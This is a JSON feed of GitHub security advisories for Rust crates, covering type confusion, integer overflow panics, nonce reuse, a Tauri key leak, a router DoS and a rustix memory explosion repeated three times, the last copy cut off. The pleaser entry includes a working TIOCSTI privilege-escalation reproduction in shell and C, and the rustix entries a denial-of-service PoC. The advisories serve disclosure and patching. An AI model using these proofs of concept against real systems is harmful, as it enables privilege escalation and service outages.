{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Rust crates",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rust.json",
    "description": "Security Advisory for Rust crates on GitHub",
    "items": [
        {
            "content_html": "<p>An issue was discovered in the failure crate through 0.1.5 for Rust. It has a type confusion flaw when downcasting. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-25575\">https://nvd.nist.gov/vuln/detail/CVE-2020-25575</a></li>\n<li><a href=\"https://github.com/rust-lang-nursery/failure/issues/336\">https://github.com/rust-lang-nursery/failure/issues/336</a></li>\n<li><a href=\"https://github.com/RustCrypto/hashes/pull/91\">https://github.com/RustCrypto/hashes/pull/91</a></li>\n<li><a href=\"https://boats.gitlab.io/blog/post/failure-to-fehler/\">https://boats.gitlab.io/blog/post/failure-to-fehler/</a></li>\n<li><a href=\"https://github.com/RustSec/advisory-db/blob/main/crates/failure/RUSTSEC-2019-0036.md\">https://github.com/RustSec/advisory-db/blob/main/crates/failure/RUSTSEC-2019-0036.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2019-0036.html\">https://rustsec.org/advisories/RUSTSEC-2019-0036.html</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0036.html\">https://rustsec.org/advisories/RUSTSEC-2020-0036.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jq66-xh47-j9f3\">https://github.com/advisories/GHSA-jq66-xh47-j9f3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jq66-xh47-j9f3",
            "title": "[failure] Type confusion if __private_get_type_id__ is overriden",
            "date_modified": "2023-11-02T22:50:48.000Z",
            "date_published": "2022-06-16T23:06:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jq66-xh47-j9f3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Panic vulnerability when a specially crafted payload is used. \nThis is because of the following calculation:</p>\n<pre><code class=\"language-rust\">inner_payload_len + (4 - inner_payload_len % 4) % 4\n</code></pre>\n<p>If <code>inner_payload_len</code> is <code>0xffffffff</code>, <code>(4 - inner_payload_len % 4) % 4 = 1</code> so</p>\n<pre><code class=\"language-rust\">inner_payload_len + (4 - inner_payload_len % 4) % 4 = u32::MAX + 1\n</code></pre>\n<p>which overflow.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Check that <code>inner_payload_len</code> is not above 64 which should never be the case.\nPatched in version 0.0.8</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Sanitize input payload before it is passed to the vulnerable function so that bytes in <code>payload[32..32+4]</code> and parsed as a <code>u32</code> is not above 64.</p>\n<h3 id=\"references\">References</h3>\n<p>GitHub issue #58</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/stellar/rs-stellar-strkey/security/advisories/GHSA-5873-6fwq-463f\">https://github.com/stellar/rs-stellar-strkey/security/advisories/GHSA-5873-6fwq-463f</a></li>\n<li><a href=\"https://github.com/stellar/rs-stellar-strkey/issues/58\">https://github.com/stellar/rs-stellar-strkey/issues/58</a></li>\n<li><a href=\"https://github.com/stellar/rs-stellar-strkey/pull/59\">https://github.com/stellar/rs-stellar-strkey/pull/59</a></li>\n<li><a href=\"https://github.com/stellar/rs-stellar-strkey/commit/83adad0f5b1cda693c7ba8524d395add8077865f\">https://github.com/stellar/rs-stellar-strkey/commit/83adad0f5b1cda693c7ba8524d395add8077865f</a></li>\n<li><a href=\"https://github.com/stellar/rs-stellar-strkey/releases/tag/v0.0.8\">https://github.com/stellar/rs-stellar-strkey/releases/tag/v0.0.8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46135\">https://nvd.nist.gov/vuln/detail/CVE-2023-46135</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5873-6fwq-463f\">https://github.com/advisories/GHSA-5873-6fwq-463f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5873-6fwq-463f",
            "title": "[stellar-strkey] stellar-strkey vulnerable to panic in SignedPayload::from_payload",
            "date_modified": "2023-10-31T21:21:36.000Z",
            "date_published": "2023-10-25T14:09:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5873-6fwq-463f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Problem</strong>: Trying to create a new encrypted message with the same cocoon object generates the same ciphertext. It mostly affects <code>MiniCocoon</code> and <code>Cocoon</code> objects with custom seeds and RNGs (where <code>StdRng</code> is used under the hood).</p>\n<p><strong>Note</strong>: The issue does <strong>NOT</strong> affect objects created with <strong><code>Cocoon::new</code></strong> which utilizes <code>ThreadRng</code>.</p>\n<p><strong>Cause</strong>: <code>StdRng</code> produces the same nonce because <code>StdRng::clone</code> resets its state.</p>\n<p><strong>Measure</strong>: Make encryption API mutable (<code>encrypt</code>, <code>wrap</code>, and <code>dump</code>).</p>\n<p><strong>Workaround</strong>: Create a new cocoon object with a new <strong>seed</strong> per each encryption.</p>\n<h2 id=\"how-to-reproduce\">How to Reproduce</h2>\n<pre><code class=\"language-rust\">let cocoon = MiniCocoon::from_password(b\"password\", &amp;[1; 32]);\nlet mut data1 = \"my secret data\".to_owned().into_bytes();\nlet _ = cocoon.encrypt(&amp;mut data1)?;\n\nlet mut data2 = \"my secret data\".to_owned().into_bytes();\nlet _ = cocoon.encrypt(&amp;mut data2)?;\n\n// data1: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]\n// data2: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]\n</code></pre>\n<h2 id=\"workaround\">Workaround</h2>\n<p>For <code>cocoon &lt;= 0.3.3</code>, create a new cocoon with a different <strong>seed</strong> per each <code>encrypt</code>/<code>wrap</code>/<code>dump</code> call.</p>\n<pre><code class=\"language-rust\">let cocoon = MiniCocoon::from_password(b\"password\", &amp;[1; 32]);\nlet mut data1 = \"my secret data\".to_owned().into_bytes();\nlet _ = cocoon.encrypt(&amp;mut data1)?;\n\n// Another seed: &amp;[2; 32].\nlet cocoon = MiniCocoon::from_password(b\"password\", &amp;[2; 32]);\nlet mut data2 = \"my secret data\".to_owned().into_bytes();\nlet _ = cocoon.encrypt(&amp;mut data2)?;\n\n// data1: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]\n// data2: [53, 223, 209, 96, 130, 99, 209, 108, 83, 189, 123, 81, 19, 1]\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fadeevab/cocoon/issues/22\">https://github.com/fadeevab/cocoon/issues/22</a></li>\n<li><a href=\"https://github.com/fadeevab/cocoon/commit/1b6392173ce35db4736a94b62b2d2973f9a71441\">https://github.com/fadeevab/cocoon/commit/1b6392173ce35db4736a94b62b2d2973f9a71441</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0068.html\">https://rustsec.org/advisories/RUSTSEC-2023-0068.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6878-6wc2-pf5h\">https://github.com/advisories/GHSA-6878-6wc2-pf5h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6878-6wc2-pf5h",
            "title": "[cocoon] Sequential calls of encryption API (`encrypt`, `wrap`, and `dump`) result in nonce reuse",
            "date_modified": "2023-10-24T19:22:26.000Z",
            "date_published": "2023-10-24T19:22:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6878-6wc2-pf5h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>please (aka pleaser) through 0.5.4 allows privilege escalation through the TIOCSTI and/or TIOCLINUX ioctl. (If both TIOCSTI and TIOCLINUX are disabled, this cannot be exploited.)</p>\n<p>Here is how to see it in action:</p>\n<pre><code>$ cd \"$(mktemp -d)\"\n$ git clone --depth 1 https://gitlab.com/edneville/please.git\n$ cd please/\n$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9\n$ cargo test &amp;&amp; cargo build --release\n$ echo \"[${USER}_as_nobody]\"$'\\nname='\"${USER}\"$'\\ntarget=nobody\\nrule=.*\\nrequire_pass=false' | sudo tee /etc/please.ini\n$ sudo chown root:root ./target/release/please\n$ sudo chmod u+s ./target/release/please\n$ cat &lt;&lt;TIOCSTI_C_EOF | tee TIOCSTI.c\n#include &lt;sys/ioctl.h&gt;\n\nint main(void) {\n  const char *text = \"id\\n\";\n  while (*text)\n    ioctl(0, TIOCSTI, text++);\n  return 0;\n}\nTIOCSTI_C_EOF\n$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c\n$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody\n</code></pre>\n<p>Please note that:</p>\n<p>This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46277\">https://nvd.nist.gov/vuln/detail/CVE-2023-46277</a></li>\n<li><a href=\"https://github.com/rustsec/advisory-db/pull/1798\">https://github.com/rustsec/advisory-db/pull/1798</a></li>\n<li><a href=\"https://gitlab.com/edneville/please/-/issues/13\">https://gitlab.com/edneville/please/-/issues/13</a></li>\n<li><a href=\"https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575\">https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0066.html\">https://rustsec.org/advisories/RUSTSEC-2023-0066.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgf8-h3fp-h956\">https://github.com/advisories/GHSA-cgf8-h3fp-h956</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgf8-h3fp-h956",
            "title": "[pleaser] Pleaser privilege escalation vulnerability",
            "date_modified": "2023-10-31T21:41:27.000Z",
            "date_published": "2023-10-20T06:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgf8-h3fp-h956"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This advisory is not describing a vulnerability in the Tauri code base itself but a commonly used misconfiguration which could lead to leaking of the private key and updater key password into bundled Tauri applications using the Vite frontend in a specific configuration.</p>\n<p>The Tauri documentation used an insecure example configuration in the <a href=\"https://tauri.app/v1/guides/getting-started/setup/vite/\">Vite guide</a> to showcase how to use Tauri together with Vite. </p>\n<p>Copying the following snippet <code>envPrefix: ['VITE_', 'TAURI_'],</code> from this guide into the <code>vite.config.ts</code> of a Tauri project possibly leads to bundling the <code>TAURI_PRIVATE_KEY</code> and <code>TAURI_KEY_PASSWORD</code> into the Vite frontend code and therefore leaking this value to the debug built of a Tauri application.</p>\n<p>The value is automatically bundled into debug builds but for production builds it is not embedded, as long as it is not directly referenced in the frontend code. Vite statically replaces these values in production builds. This reduces the amount of affected applications to a very small amount of affected applications.</p>\n<p>To verify if you are affected you can search for the private key value or the <code>TAURI_PRIVATE_KEY</code> variable inside the release build frontend assets (<code>dist/</code>).</p>\n<blockquote>\n<p>Example: <code>grep -r \"TAURI_PRIVATE_KEY\" dist/</code></p>\n</blockquote>\n<p>Using only the <code>envPrefix: ['VITE_'],</code> or any other framework than Vite means you are not impacted by this advisory.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The documentation has been patched but as the root cause is not in Tauri itself the issue is not fixed by updating Tauri.\nThe <code>vite.config.ts</code> configuration of the project needs to be adapted.</p>\n<p>We recommend rotating your updater private key if you are affected by this (requires Tauri CLI &gt;=1.5.5). After updating the envPrefix configuration, generate a new private key with <code>tauri signer generate</code>, saving the new private key and updating the updater's <code>pubkey</code> value on <code>tauri.conf.json</code> with the new public key. To update your existing application, the next application build must be signed with the older private key in order to be accepted by the existing application.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The <code>envPrefix: ['VITE_'],</code>should be used and the desired <code>TAURI</code> variables manually added.\nRespective these variables could be added <code>TAURI_PLATFORM</code>, <code>TAURI_ARCH</code>, <code>TAURI_FAMILY</code>, <code>TAURI_PLATFORM_VERSION</code>, <code>TAURI_PLATFORM_TYPE</code> and <code>TAURI_DEBUG</code> without leaking sensitive information.</p>\n<p>We urge affected users to implement the workaround as the <code>1.x</code> branch will not receive a general prevention fix as it would break systems.</p>\n<h3 id=\"references\">References</h3>\n<p>The issue was originally disclosed in our discord <a href=\"https://discord.com/channels/616186924390023171/1164260301655523409\">here</a>.\nThe affected guide is <a href=\"https://tauri.app/v1/guides/getting-started/setup/vite/\">https://tauri.app/v1/guides/getting-started/setup/vite/</a>.</p>\n<blockquote>\n<p>Update: We lowered the severity from high to low, as the likelihood of impact was found to only affect a <strong>very limited</strong> amount of applications.</p>\n</blockquote>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tauri-apps/tauri/security/advisories/GHSA-2rcp-jvr4-r259\">https://github.com/tauri-apps/tauri/security/advisories/GHSA-2rcp-jvr4-r259</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46115\">https://nvd.nist.gov/vuln/detail/CVE-2023-46115</a></li>\n<li><a href=\"https://github.com/tauri-apps/tauri/commit/8b166e9bf82e69ddb3200a3a825614980bd8d433\">https://github.com/tauri-apps/tauri/commit/8b166e9bf82e69ddb3200a3a825614980bd8d433</a></li>\n<li><a href=\"https://discord.com/channels/616186924390023171/1164260301655523409\">https://discord.com/channels/616186924390023171/1164260301655523409</a></li>\n<li><a href=\"https://tauri.app/v1/guides/getting-started/setup/vite/\">https://tauri.app/v1/guides/getting-started/setup/vite/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2rcp-jvr4-r259\">https://github.com/advisories/GHSA-2rcp-jvr4-r259</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2rcp-jvr4-r259",
            "title": "[tauri-cli] Tauri's Updater Private Keys Possibly Leaked via Vite Environment Variables",
            "date_modified": "2023-10-31T21:26:23.000Z",
            "date_published": "2023-10-20T15:18:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2rcp-jvr4-r259"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Apollo Router is a configurable, high-performance graph router written in Rust to run a federated supergraph that uses Apollo Federation. Affected versions are subject to a Denial-of-Service (DoS) type vulnerability which causes the Router to panic and terminate when a multi-part response is sent. When users send queries to the router that uses the <code>@defer</code> or Subscriptions, the Router will panic.</p>\n<p>To be vulnerable, users of Router must have a coprocessor with <code>coprocessor.supergraph.response</code> configured in their <code>router.yaml</code> and also to support either <code>@defer</code> or Subscriptions.  </p>\n<h3 id=\"patches\">Patches</h3>\n<p>Router version 1.33.0 has a fix for this vulnerability. <a href=\"https://github.com/apollographql/router/pull/4014\">https://github.com/apollographql/router/pull/4014</a> fixes the issue.  </p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For affected versions, avoid using the coprocessor supergraph response:</p>\n<pre><code class=\"language-yml\"># do not use this stage in your coprocessor configuration\ncoprocessor:\n  supergraph:\n    response:\n</code></pre>\n<p>Or you can disable defer and subscriptions support:</p>\n<pre><code class=\"language-yml\"># disable defer and subscriptions:\nsupergraph:\n  defer_support: false # enabled by default\nsubscription:\n  enabled: false # disabled by default\n</code></pre>\n<p>and continue to use the coprocessor supergraph response.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/apollographql/router/issues/4013\">https://github.com/apollographql/router/issues/4013</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/apollographql/router/security/advisories/GHSA-r344-xw3p-2frj\">https://github.com/apollographql/router/security/advisories/GHSA-r344-xw3p-2frj</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-45812\">https://nvd.nist.gov/vuln/detail/CVE-2023-45812</a></li>\n<li><a href=\"https://github.com/apollographql/router/issues/4013\">https://github.com/apollographql/router/issues/4013</a></li>\n<li><a href=\"https://github.com/apollographql/router/pull/4014\">https://github.com/apollographql/router/pull/4014</a></li>\n<li><a href=\"https://github.com/apollographql/router/commit/b917b8c117b46a2d508428c0856f4927dfcfc341\">https://github.com/apollographql/router/commit/b917b8c117b46a2d508428c0856f4927dfcfc341</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r344-xw3p-2frj\">https://github.com/advisories/GHSA-r344-xw3p-2frj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r344-xw3p-2frj",
            "title": "[apollo-router] Apollo Router vulnerable to Improper Check or Handling of Exceptional Conditions",
            "date_modified": "2023-10-20T17:06:33.000Z",
            "date_published": "2023-10-19T16:08:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r344-xw3p-2frj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to \"get stuck\" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"discovery\">Discovery</h4>\n<p>The symptoms were initially discovered in <a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">this post</a> and the <a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">Discord thread</a> for details.</p>\n<h4 id=\"diagnosis\">Diagnosis</h4>\n<p>This issue is caused by the combination of two independent bugs:</p>\n<ol>\n<li>Stuck iterator</li>\n</ol>\n<ul>\n<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>\n</ul>\n<ol start=\"2\">\n<li>Memory over-allocation</li>\n</ol>\n<ul>\n<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>\n</ul>\n<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-rust\">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {\n    // create a directory, get a FD to it, then unlink the directory but keep the FD\n    std::fs::create_dir(\"tmp_dir\")?;\n    let dir_fd = rustix::fs::openat(\n        rustix::fs::CWD,\n        rustix::cstr!(\"tmp_dir\"),\n        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,\n        rustix::fs::Mode::empty(),\n    )?;\n    std::fs::remove_dir(\"tmp_dir\")?;\n\n    // iterator gets stuck in infinite loop and memory explodes\n    rustix::fs::Dir::read_from(dir_fd)?\n        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`\n        // therefore if the implementation ignores the error (or otherwise continues\n        // after seeing the error instead of breaking), the loop will not halt\n        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())\n        .for_each(|dirent| {\n            // your happy path\n            println!(\"{dirent:?}\");\n        });\n\n    Ok(())\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>\n<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>\n<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159\">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec\">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6\">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5\">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>\n<li><a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm",
            "title": "[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion",
            "date_modified": "2023-10-18T18:27:49.000Z",
            "date_published": "2023-10-18T18:27:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to \"get stuck\" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"discovery\">Discovery</h4>\n<p>The symptoms were initially discovered in <a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">this post</a> and the <a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">Discord thread</a> for details.</p>\n<h4 id=\"diagnosis\">Diagnosis</h4>\n<p>This issue is caused by the combination of two independent bugs:</p>\n<ol>\n<li>Stuck iterator</li>\n</ol>\n<ul>\n<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>\n</ul>\n<ol start=\"2\">\n<li>Memory over-allocation</li>\n</ol>\n<ul>\n<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>\n</ul>\n<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-rust\">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {\n    // create a directory, get a FD to it, then unlink the directory but keep the FD\n    std::fs::create_dir(\"tmp_dir\")?;\n    let dir_fd = rustix::fs::openat(\n        rustix::fs::CWD,\n        rustix::cstr!(\"tmp_dir\"),\n        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,\n        rustix::fs::Mode::empty(),\n    )?;\n    std::fs::remove_dir(\"tmp_dir\")?;\n\n    // iterator gets stuck in infinite loop and memory explodes\n    rustix::fs::Dir::read_from(dir_fd)?\n        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`\n        // therefore if the implementation ignores the error (or otherwise continues\n        // after seeing the error instead of breaking), the loop will not halt\n        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())\n        .for_each(|dirent| {\n            // your happy path\n            println!(\"{dirent:?}\");\n        });\n\n    Ok(())\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>\n<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>\n<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159\">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec\">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6\">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5\">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>\n<li><a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm",
            "title": "[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion",
            "date_modified": "2023-10-18T18:27:49.000Z",
            "date_published": "2023-10-18T18:27:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to \"get stuck\" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"discovery\">Discovery</h4>\n<p>The symptoms were initially discovered in <a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">this post</a> and the <a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">Discord thread</a> for details.</p>\n<h4 id=\"diagnosis\">Diagnosis</h4>\n<p>This issue is caused by the combination of two independent bugs:</p>\n<ol>\n<li>Stuck iterator</li>\n</ol>\n<ul>\n<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>\n</ul>\n<ol start=\"2\">\n<li>Memory over-allocation</li>\n</ol>\n<ul>\n<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>\n</ul>\n<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-rust\">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {\n    // create a directory, get a FD to it, then unlink the directory but keep the FD\n    